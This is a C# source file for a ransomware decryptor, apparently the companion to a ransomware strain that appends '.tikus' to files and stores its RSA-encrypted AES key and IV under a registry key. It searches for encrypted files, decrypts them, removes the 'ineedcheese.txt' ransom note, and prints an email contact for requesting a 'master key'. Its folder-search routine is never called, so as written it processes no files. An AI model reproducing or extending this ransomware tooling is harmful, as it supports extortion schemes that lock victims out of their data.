using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Decryptor
{
    public class GetKey
    {
        public static RegistryKey LocalReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\FreePalestine");

        public static string GetPublicKey()
        {
            var publicKey = File.ReadAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"));
            return publicKey;
        }

        public static string GetPrivateKey()
        {
            string privateKey = Encoding.UTF8.GetString((byte[])LocalReg.GetValue("privateKey"));
            return privateKey;
        }

        public static byte[] GetAESKey()
        {
            byte[] aeskey = (byte[])LocalReg.GetValue("aesKey");

            return aeskey;
        }

        public static byte[] GetAESIV()
        {
            byte[] aesiv = (byte[])LocalReg.GetValue("aesIV");

            return aesiv;
        }
    }

    public class Asymmetric
    {

        public class RSA
        {
            /// <summary>
            /// Create a public and private key.
            ///
            /// The RSACryptoServiceProvider supports key sizes from 384
            /// bits to 16384 bits in increments of 8 bits if you have the
            /// Microsoft Enhanced Cryptographic Provider installed. It
            /// supports key sizes from 384 bits to 512 bits in increments
            /// of 8 bits if you have the Microsoft Base Cryptographic
            /// Provider installed.
            /// </summary>
            /// <param name="publicKey">The created public key.</param>
            /// <param name="privateKey">The created private key.</param>
            /// <param name="keySize">Size of keys.</param>
            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
            {
                publicKey = null;
                privateKey = null;

                var csp = new CspParameters
                {
                    ProviderType = 1,
                    Flags = CspProviderFlags.UseArchivableKey,
                    KeyNumber = (int)KeyNumber.Exchange
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(keySize, csp);

                publicKey = rsa.ToXmlString(false);
                privateKey = rsa.ToXmlString(true);

                rsa.PersistKeyInCsp = false;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="bytes">Bytes to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static byte[] Encrypt(byte[] bytes, string publicKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(publicKey);
                var data = rsa.Encrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Encrypt data using a public key.
            /// </summary>
            /// <param name="input">Data to encrypt.</param>
            /// <param name="publicKey">Public key to use.</param>
            /// <returns>Encrypted data.</returns>
            public static string Encrypt(string input, string publicKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Convert.ToBase64String(
                    Encrypt(
                        Encoding.UTF8.GetBytes(input),
                        publicKey));
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="bytes">Bytes to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static byte[] Decrypt(byte[] bytes, string privateKey)
            {
                var csp = new CspParameters
                {
                    ProviderType = 1
                };

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(csp);

                rsa.FromXmlString(privateKey);
                var data = rsa.Decrypt(bytes, false);

                rsa.PersistKeyInCsp = false;

                return data;
            }

            /// <summary>
            /// Decrypt data using a private key.
            /// </summary>
            /// <param name="input">Base64 data to decrypt.</param>
            /// <param name="privateKey">Private key to use.</param>
            /// <returns>Decrypted data.</returns>
            public static string Decrypt(string input, string privateKey)
            {
                if (input == null)
                {
                    throw new Exception("Input cannot be null");
                }

                return Encoding.UTF8.GetString(
                    Decrypt(
                        Convert.FromBase64String(input),
                        privateKey));
            }
        }
    }

    public class AES
    {
        public static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {

            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = aes_key;
            alg.IV = aes_iv;

            CryptoStream cs = new CryptoStream(ms,
                alg.CreateDecryptor(), CryptoStreamMode.Write);

            cs.Write(cipherData, 0, cipherData.Length);

            cs.Close();

            byte[] decryptedData = ms.ToArray();

            return decryptedData;
        }
    }

    class Program
    {
        private static readonly string ransomFormat = ".tikus";

        public static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        public static string CPrivKey = @"REPLACE ME";

        private static Dictionary<DirectoryInfo, List<string>> validDirs = new Dictionary<DirectoryInfo, List<string>>();
        private static List<string> logger = new List<string>();
        static void RecursiveSearch(string root)
        {
            string[] files = null;
            string[] subDirs = null;

            // First, process all the files directly under this folder 
            try
            {
                files = Directory.EnumerateFiles(root).Where(x => Path.GetExtension(x).Equals(ransomFormat)).ToArray();
            }
            catch (UnauthorizedAccessException e)
            {
                logger.Add(e.Message);
            }
            catch (System.IO.DirectoryNotFoundException e)
            {
                Console.WriteLine(e.Message);
            }

            if (files != null)
            {

                validDirs.Add(new DirectoryInfo(root), files.ToList());
                subDirs = Directory.GetDirectories(root);

                foreach (string dir in subDirs)
                {
                    RecursiveSearch(dir);
                }
            }
        }

        static void Main(string[] args)
        {
            var baseDir = @"C:";

            var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (!IsElevated)
            {
                Console.WriteLine("Make sure to run this as administrator");
            }
            else
            {

                if (Directory.Exists(baseDir))
                {
                    try
                    {
                        byte[] aes_key = new byte[] { };
                        byte[] aes_iv = new byte[] { };
                        //var privateKey = GetKey.GetPrivateKey();
                        try
                        {
                            aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), CPrivKey);

                            aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), CPrivKey);
                        }
                        catch
                        {
                            Console.WriteLine("Keys have been changed, request for master key at agenttikus@gmail.com");
                            return;
                        }

                        //decrypt with this
                        foreach (var dir in validDirs.Values)
                        {
                            foreach (var file in dir)
                            {
                                var decryptedFile = Path.GetFileNameWithoutExtension(file);
                                var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
                                var ransomNotePath = Path.GetDirectoryName(file) + "\\ineedcheese.txt";

                                if (!File.Exists(decryptedFile))
                                {
                                    var fileContent = File.ReadAllBytes(file);
                                    File.Delete(file);

                                    //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
                                    try
                                    {
                                        var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
                                        File.WriteAllBytes(outputFile, decrypted);

                                        if (File.Exists(ransomNotePath))
                                            File.Delete(ransomNotePath);

                                    }
                                    catch
                                    {
                                    }

                                }
                            }
                        }
                    }
                    catch
                    {

                    }

                }

            }
        }
    }

}